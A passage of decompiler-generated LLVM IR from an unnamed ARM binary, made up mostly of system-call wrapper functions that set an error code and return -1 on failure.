  %v9_10f18 = load i32, i32* @r3, align 4
  store i32 %v9_10f18, i32* %stack_var_-4, align 4
  %v1_10f28 = and i32 %arg2, 64
  %v2_10f28 = icmp eq i32 %v1_10f28, 0
  br i1 %v2_10f28, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10f18
  %v3_10f30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_10f30, i32* @r3, align 4
  %phitmp = urem i32 %v6_10f18, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10f18, %bb
  %v0_10f34 = phi i32 [ 0, %dec_label_pc_10f18 ], [ %phitmp, %bb ]
  store i32 %v0_10f34, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10f64, label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %.thread
  %v0_10f54 = call i32 @function_11734()
  %v0_10f58 = load i32, i32* %r7.global-to-local, align 4
  %v1_10f58 = sub i32 0, %v0_10f58
  store i32 %v1_10f58, i32* @r3, align 4
  %v2_10f5c = inttoptr i32 %v0_10f54 to i32*
  store i32 %v1_10f58, i32* %v2_10f5c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10f64

dec_label_pc_10f64:                               ; preds = %.thread, %dec_label_pc_10f54
  %v0_10f64 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_10f54 ]
  ret i32 %v0_10f64

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10f64, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10f78() local_unnamed_addr {
dec_label_pc_10f78:
  %v1_10f88 = load i32, i32* @r0, align 4
  ret i32 %v1_10f88
}

define i32 @function_10f8c(i32* %arg1) local_unnamed_addr {
dec_label_pc_10f8c:
  %stack_var_-16 = alloca i32, align 4
  %v2_10f90 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10fa0 = call i32 @function_1110c(i32 %v2_10f90, i32 0)
  %v2_10fa4 = load i32, i32* %stack_var_-16, align 4
  %v2_10fa8 = icmp eq i32* %arg1, null
  br i1 %v2_10fa8, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_10f8c
  store i32 %v2_10fa4, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_10f8c, %bb
  ret i32 %v2_10fa4

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_10fbc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10fbc:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_10ff0, label %dec_label_pc_10fe0

dec_label_pc_10fe0:                               ; preds = %dec_label_pc_10fbc
  %v0_10fe0 = call i32 @function_11734()
  %v0_10fe4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10fe4 = sub i32 0, %v0_10fe4
  %v2_10fe8 = inttoptr i32 %v0_10fe0 to i32*
  store i32 %v1_10fe4, i32* %v2_10fe8, align 4
  br label %dec_label_pc_10ff0

dec_label_pc_10ff0:                               ; preds = %dec_label_pc_10fbc, %dec_label_pc_10fe0
  %v1_10ff8 = phi i32 [ %arg1, %dec_label_pc_10fbc ], [ -1, %dec_label_pc_10fe0 ]
  ret i32 %v1_10ff8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10ff0, { 1, 0 }
}

define i32 @function_10ffc() local_unnamed_addr {
dec_label_pc_10ffc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10ffc = load i32, i32* @r7, align 4
  store i32 %v3_10ffc, i32* %stack_var_-8, align 4
  %v0_11008 = load i32, i32* @r0, align 4
  store i32 %v0_11008, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11008, -4095
  br i1 %tmp, label %dec_label_pc_11028, label %dec_label_pc_11018

dec_label_pc_11018:                               ; preds = %dec_label_pc_10ffc
  %v0_11018 = call i32 @function_11734()
  %v0_1101c = load i32, i32* %r7.global-to-local, align 4
  %v1_1101c = sub i32 0, %v0_1101c
  %v2_11020 = inttoptr i32 %v0_11018 to i32*
  store i32 %v1_1101c, i32* %v2_11020, align 4
  %v2_11028.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11028

dec_label_pc_11028:                               ; preds = %dec_label_pc_10ffc, %dec_label_pc_11018
  %v1_1102c = phi i32 [ %v0_11008, %dec_label_pc_10ffc ], [ -1, %dec_label_pc_11018 ]
  %v2_11028 = phi i32 [ %v3_10ffc, %dec_label_pc_10ffc ], [ %v2_11028.pre, %dec_label_pc_11018 ]
  store i32 %v2_11028, i32* @r7, align 4
  ret i32 %v1_1102c

; uselistorder directives
  uselistorder i32 %v0_11008, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11028, { 1, 0 }
}

define i32 @function_11030(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_11030:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11060, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11030
  %v0_11050 = call i32 @function_11734()
  %v0_11054 = load i32, i32* %r4.global-to-local, align 4
  %v1_11054 = sub i32 0, %v0_11054
  %v2_11058 = inttoptr i32 %v0_11050 to i32*
  store i32 %v1_11054, i32* %v2_11058, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11060

dec_label_pc_11060:                               ; preds = %dec_label_pc_11030, %dec_label_pc_11050
  %v0_11060 = phi i32 [ %arg1, %dec_label_pc_11030 ], [ -1, %dec_label_pc_11050 ]
  ret i32 %v0_11060

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11060, { 1, 0 }
}

define i32 @function_11070(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11070:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11070 = load i32, i32* @r7, align 4
  store i32 %v3_11070, i32* %stack_var_-8, align 4
  %v0_1107c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1107c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1107c, -4095
  br i1 %tmp, label %dec_label_pc_1109c, label %dec_label_pc_1108c

dec_label_pc_1108c:                               ; preds = %dec_label_pc_11070
  %v0_1108c = call i32 @function_11734()
  %v0_11090 = load i32, i32* %r7.global-to-local, align 4
  %v1_11090 = sub i32 0, %v0_11090
  store i32 %v1_11090, i32* @r3, align 4
  %v2_11094 = inttoptr i32 %v0_1108c to i32*
  store i32 %v1_11090, i32* %v2_11094, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1109c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %dec_label_pc_11070, %dec_label_pc_1108c
  %v1_110a0 = phi i32 [ %v0_1107c, %dec_label_pc_11070 ], [ -1, %dec_label_pc_1108c ]
  %v2_1109c = phi i32 [ %v3_11070, %dec_label_pc_11070 ], [ %v2_1109c.pre, %dec_label_pc_1108c ]
  store i32 %v2_1109c, i32* @r7, align 4
  ret i32 %v1_110a0

; uselistorder directives
  uselistorder i32 %v0_1107c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1109c, { 1, 0 }
}

define i32 @function_110a4(i32 %arg1) local_unnamed_addr {
dec_label_pc_110a4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110a4 = load i32, i32* @r7, align 4
  store i32 %v3_110a4, i32* %stack_var_-8, align 4
  %v0_110b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_110b0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_110b0, -4095
  br i1 %tmp, label %dec_label_pc_110d0, label %dec_label_pc_110c0

dec_label_pc_110c0:                               ; preds = %dec_label_pc_110a4
  %v0_110c0 = call i32 @function_11734()
  %v0_110c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_110c4 = sub i32 0, %v0_110c4
  %v2_110c8 = inttoptr i32 %v0_110c0 to i32*
  store i32 %v1_110c4, i32* %v2_110c8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_110d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_110d0

dec_label_pc_110d0:                               ; preds = %dec_label_pc_110a4, %dec_label_pc_110c0
  %v1_110d4 = phi i32 [ %v0_110b0, %dec_label_pc_110a4 ], [ -1, %dec_label_pc_110c0 ]
  %v2_110d0 = phi i32 [ %v3_110a4, %dec_label_pc_110a4 ], [ %v2_110d0.pre, %dec_label_pc_110c0 ]
  store i32 %v2_110d0, i32* @r7, align 4
  ret i32 %v1_110d4

; uselistorder directives
  uselistorder i32 %v0_110b0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_110d0, { 1, 0 }
}

define i32 @function_110d8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_110d8:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_110d8 = load i32, i32* @r7, align 4
  store i32 %v3_110d8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11100, label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110d8
  %v0_110f0 = call i32 @function_11734()
  %v0_110f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_110f4 = sub i32 0, %v0_110f4
  %v2_110f8 = inttoptr i32 %v0_110f0 to i32*
  store i32 %v1_110f4, i32* %v2_110f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11104.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11100

dec_label_pc_11100:                               ; preds = %dec_label_pc_110d8, %dec_label_pc_110f0
  %v2_11104 = phi i32 [ %v3_110d8, %dec_label_pc_110d8 ], [ %v2_11104.pre, %dec_label_pc_110f0 ]
  %v0_11100 = phi i32 [ %arg1, %dec_label_pc_110d8 ], [ -1, %dec_label_pc_110f0 ]
  store i32 %v2_11104, i32* @r7, align 4
  ret i32 %v0_11100

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11100, { 1, 0 }
}

define i32 @function_1110c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1110c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1110c = load i32, i32* @r7, align 4
  store i32 %v3_1110c, i32* %stack_var_-8, align 4
  %v0_11118 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11118, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11118, -4095
  br i1 %tmp, label %dec_label_pc_11138, label %dec_label_pc_11128

dec_label_pc_11128:                               ; preds = %dec_label_pc_1110c
  %v0_11128 = call i32 @function_11734()
  %v0_1112c = load i32, i32* %r7.global-to-local, align 4
  %v1_1112c = sub i32 0, %v0_1112c
  store i32 %v1_1112c, i32* @r3, align 4
  %v2_11130 = inttoptr i32 %v0_11128 to i32*
  store i32 %v1_1112c, i32* %v2_11130, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11138.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11138

dec_label_pc_11138:                               ; preds = %dec_label_pc_1110c, %dec_label_pc_11128
  %v1_1113c = phi i32 [ %v0_11118, %dec_label_pc_1110c ], [ -1, %dec_label_pc_11128 ]
  %v2_11138 = phi i32 [ %v3_1110c, %dec_label_pc_1110c ], [ %v2_11138.pre, %dec_label_pc_11128 ]
  store i32 %v2_11138, i32* @r7, align 4
  ret i32 %v1_1113c

; uselistorder directives
  uselistorder i32 %v0_11118, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11138, { 1, 0 }
}

define i32 @function_11140(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11140:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_11140 = load i32, i32* @r3, align 4
  store i32 %v9_11140, i32* %stack_var_-4, align 4
  %v2_11158 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11158, i32* @r3, align 4
  %v0_1117c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1117c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1117c, -4095
  br i1 %tmp, label %dec_label_pc_1119c, label %dec_label_pc_1118c

dec_label_pc_1118c:                               ; preds = %dec_label_pc_11140
  %v0_1118c = call i32 @function_11734()
  %v0_11190 = load i32, i32* %r7.global-to-local, align 4
  %v1_11190 = sub i32 0, %v0_11190
  store i32 %v1_11190, i32* @r3, align 4
  %v2_11194 = inttoptr i32 %v0_1118c to i32*
  store i32 %v1_11190, i32* %v2_11194, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11140, %dec_label_pc_1118c
  %v1_111a8 = phi i32 [ %v0_1117c, %dec_label_pc_11140 ], [ -1, %dec_label_pc_1118c ]
  ret i32 %v1_111a8

; uselistorder directives
  uselistorder i32 %v0_1117c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
}

define i32 @function_111ac(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_111ac:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_111e8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_111e8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111e8, -4095
  br i1 %tmp, label %dec_label_pc_11208, label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111ac
  %v0_111f8 = call i32 @function_11734()
  %v0_111fc = load i32, i32* %r7.global-to-local, align 4
  %v1_111fc = sub i32 0, %v0_111fc
  %v2_11200 = inttoptr i32 %v0_111f8 to i32*
  store i32 %v1_111fc, i32* %v2_11200, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_111ac, %dec_label_pc_111f8
  %v1_11214 = phi i32 [ %v0_111e8, %dec_label_pc_111ac ], [ -1, %dec_label_pc_111f8 ]
  ret i32 %v1_11214

; uselistorder directives
  uselistorder i32 %v0_111e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
}

define i32 @function_11218(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11218:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11218 = load i32, i32* @r7, align 4
  store i32 %v3_11218, i32* %stack_var_-8, align 4
  %v0_11224 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11224, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11224, -4095
  br i1 %tmp, label %dec_label_pc_11244, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_11218
  %v0_11234 = call i32 @function_11734()
  %v0_11238 = load i32, i32* %r7.global-to-local, align 4
  %v1_11238 = sub i32 0, %v0_11238
  %v2_1123c = inttoptr i32 %v0_11234 to i32*
  store i32 %v1_11238, i32* %v2_1123c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11244.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11244

dec_label_pc_11244:                               ; preds = %dec_label_pc_11218, %dec_label_pc_11234
  %v1_11248 = phi i32 [ %v0_11224, %dec_label_pc_11218 ], [ -1, %dec_label_pc_11234 ]
  %v2_11244 = phi i32 [ %v3_11218, %dec_label_pc_11218 ], [ %v2_11244.pre, %dec_label_pc_11234 ]
  store i32 %v2_11244, i32* @r7, align 4
  ret i32 %v1_11248

; uselistorder directives
  uselistorder i32 %v0_11224, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11244, { 1, 0 }
}

define i32 @function_1124c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1124c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1124c = load i32, i32* @r7, align 4
  store i32 %v3_1124c, i32* %stack_var_-8, align 4
  %v0_11258 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11258, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11258, -4095
  br i1 %tmp, label %dec_label_pc_11278, label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_1124c
  %v0_11268 = call i32 @function_11734()
  %v0_1126c = load i32, i32* %r7.global-to-local, align 4
  %v1_1126c = sub i32 0, %v0_1126c
  %v2_11270 = inttoptr i32 %v0_11268 to i32*
  store i32 %v1_1126c, i32* %v2_11270, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11278.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11278

dec_label_pc_11278:                               ; preds = %dec_label_pc_1124c, %dec_label_pc_11268
  %v1_1127c = phi i32 [ %v0_11258, %dec_label_pc_1124c ], [ -1, %dec_label_pc_11268 ]
  %v2_11278 = phi i32 [ %v3_1124c, %dec_label_pc_1124c ], [ %v2_11278.pre, %dec_label_pc_11268 ]
  store i32 %v2_11278, i32* @r7, align 4
  ret i32 %v1_1127c

; uselistorder directives
  uselistorder i32 %v0_11258, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11278, { 1, 0 }
}

define i32 @function_11280(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11280:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_11280 = load i32, i32* @r3, align 4
  store i32 %v9_11280, i32* %stack_var_-4, align 4
  %v2_1128c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1128c, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_112c0, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_11280
  %v0_112b0 = call i32 @function_11734()
  %v0_112b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_112b4 = sub i32 0, %v0_112b4
  store i32 %v1_112b4, i32* @r3, align 4
  %v2_112b8 = inttoptr i32 %v0_112b0 to i32*
  store i32 %v1_112b4, i32* %v2_112b8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_11280, %dec_label_pc_112b0
  %v0_112c0 = phi i32 [ %arg1, %dec_label_pc_11280 ], [ -1, %dec_label_pc_112b0 ]
  ret i32 %v0_112c0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112c0, { 1, 0 }
}

define i32 @function_112d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_112d4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112d4 = load i32, i32* @r7, align 4
  store i32 %v3_112d4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11300, label %dec_label_pc_112f0

dec_label_pc_112f0:                               ; preds = %dec_label_pc_112d4
  %v0_112f0 = call i32 @function_11734()
  %v0_112f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_112f4 = sub i32 0, %v0_112f4
  %v2_112f8 = inttoptr i32 %v0_112f0 to i32*
  store i32 %v1_112f4, i32* %v2_112f8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_11304.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11300

dec_label_pc_11300:                               ; preds = %dec_label_pc_112d4, %dec_label_pc_112f0
  %v2_11304 = phi i32 [ %v3_112d4, %dec_label_pc_112d4 ], [ %v2_11304.pre, %dec_label_pc_112f0 ]
  %v0_11300 = phi i32 [ %arg1, %dec_label_pc_112d4 ], [ -1, %dec_label_pc_112f0 ]
  store i32 %v2_11304, i32* @r7, align 4
  ret i32 %v0_11300

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11300, { 1, 0 }
}

define i32 @function_1130c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1130c:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1130c = load i32, i32* @r7, align 4
  store i32 %v3_1130c, i32* %stack_var_-8, align 4
  %v0_11318 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11318, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11318, -4095
  br i1 %tmp, label %dec_label_pc_11338, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_1130c
  %v0_11328 = call i32 @function_11734()
  %v0_1132c = load i32, i32* %r7.global-to-local, align 4
  %v1_1132c = sub i32 0, %v0_1132c
  store i32 %v1_1132c, i32* @r3, align 4
  %v2_11330 = inttoptr i32 %v0_11328 to i32*
  store i32 %v1_1132c, i32* %v2_11330, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11338.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11338

dec_label_pc_11338:                               ; preds = %dec_label_pc_1130c, %dec_label_pc_11328
  %v1_1133c = phi i32 [ %v0_11318, %dec_label_pc_1130c ], [ -1, %dec_label_pc_11328 ]
  %v2_11338 = phi i32 [ %v3_1130c, %dec_label_pc_1130c ], [ %v2_11338.pre, %dec_label_pc_11328 ]
  store i32 %v2_11338, i32* @r7, align 4
  ret i32 %v1_1133c

; uselistorder directives
  uselistorder i32 %v0_11318, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11338, { 1, 0 }
}

define i32 @function_11340(i32* %arg1) local_unnamed_addr {
dec_label_pc_11340:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_11340 = load i32, i32* @r4, align 4
  store i32 %v3_11340, i32* %stack_var_-24, align 4
  %v9_11340 = load i32, i32* @r6, align 4
  %v12_11340 = load i32, i32* @r7, align 4
  %v15_11340 = load i32, i32* @r8, align 4
  %v18_11340 = load i32, i32* @lr, align 4
  %v2_11344 = load i32, i32* %arg1, align 4
  store i32 %v2_11344, i32* %r4.global-to-local, align 4
  %v3_1134c = icmp eq i32 %v2_11344, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 126992, i32* @r6, align 4
  br i1 %v3_1134c, label %dec_label_pc_11360, label %dec_label_pc_11374

dec_label_pc_11360:                               ; preds = %dec_label_pc_11340
  %v0_11360 = call i32 @function_11734()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_11368 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11368, i32* %r2.global-to-local, align 4
  %v2_1136c = inttoptr i32 %v0_11360 to i32*
  store i32 9, i32* %v2_1136c, align 4
  %v0_11414.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11414

dec_label_pc_11374:                               ; preds = %dec_label_pc_11340
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_11378 = add i32 %tmp, 24
  store i32 %v1_11378, i32* %r4.global-to-local, align 4
  store i32 %v1_11378, i32* %r2.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_1138c = load i32, i32* inttoptr (i32 127064 to i32*), align 8
  call void @__pseudo_branch(i32 %v4_1138c)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_113a4 = load i32, i32* @r6, align 4
  %v2_113a4 = add i32 %v0_113a4, 16
  %v3_113a4 = inttoptr i32 %v2_113a4 to i32*
  %v4_113a4 = load i32, i32* %v3_113a4, align 4
  call void @__pseudo_branch(i32 %v4_113a4)
  %v0_113b0 = load i32, i32* @r7, align 4
  %v1_113b0 = inttoptr i32 %v0_113b0 to i32*
  %v2_113b0 = load i32, i32* %v1_113b0, align 4
  store i32 %v2_113b0, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_113c0 = load i32, i32* @r8, align 4
  store i32 %v0_113c0, i32* %v1_113b0, align 4
  %v0_113c4 = load i32, i32* @r6, align 4
  %v1_113c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_113c4 = add i32 %v1_113c4, %v0_113c4
  %v3_113c4 = inttoptr i32 %v2_113c4 to i32*
  %v4_113c4 = load i32, i32* %v3_113c4, align 4
  store i32 ptrtoint (i32* @global_var_113d0.330 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_113c4)
  %v0_113d0 = load i32, i32* @r7, align 4
  %v1_113d0 = add i32 %v0_113d0, 12
  %v2_113d0 = inttoptr i32 %v1_113d0 to i32*
  %v3_113d0 = load i32, i32* %v2_113d0, align 4
  store i32 %v3_113d0, i32* @r0, align 4
  %v0_113d4 = call i32 @function_12da0()
  %v0_113d8 = load i32, i32* @r7, align 4
  store i32 %v0_113d8, i32* @r0, align 4
  %v0_113dc = call i32 @function_12da0()
  %v0_113e4 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_113e4, -4095
  br i1 %tmp11, label %dec_label_pc_11410, label %dec_label_pc_11400

dec_label_pc_11400:                               ; preds = %dec_label_pc_11374
  %v0_11400 = call i32 @function_11734()
  %v0_11404 = load i32, i32* @r4, align 4
  %v1_11404 = sub i32 0, %v0_11404
  store i32 %v1_11404, i32* %r3.global-to-local, align 4
  %v2_11408 = inttoptr i32 %v0_11400 to i32*
  store i32 %v1_11404, i32* %v2_11408, align 4
  %v0_1140c = load i32, i32* @r8, align 4
  br label %dec_label_pc_11410

dec_label_pc_11410:                               ; preds = %dec_label_pc_11374, %dec_label_pc_11400
  %v0_11410 = phi i32 [ %v0_113e4, %dec_label_pc_11374 ], [ %v0_1140c, %dec_label_pc_11400 ]
  store i32 %v0_11410, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11414

dec_label_pc_11414:                               ; preds = %dec_label_pc_11360, %dec_label_pc_11410
  %v0_11414 = phi i32 [ %v0_11414.pre, %dec_label_pc_11360 ], [ %v0_11410, %dec_label_pc_11410 ]
  %v2_1141c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1141c, i32* @r4, align 4
  store i32 %v9_11340, i32* @r6, align 4
  store i32 %v12_11340, i32* @r7, align 4
  store i32 %v15_11340, i32* @r8, align 4
  store i32 %v18_11340, i32* @lr, align 4
  ret i32 %v0_11414

; uselistorder directives
  uselistorder i32 %v0_113e4, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11414, { 1, 0 }
  uselistorder label %dec_label_pc_11410, { 1, 0 }
}

define i32 @function_11428(i32 %arg1) local_unnamed_addr {
dec_label_pc_11428:
  %v0_11428 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11428, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11428
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11428, %bb
  %v10_11434 = phi i32 [ %arg1, %dec_label_pc_11428 ], [ 0, %bb ]
  ret i32 %v10_11434

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_11438(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11438:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
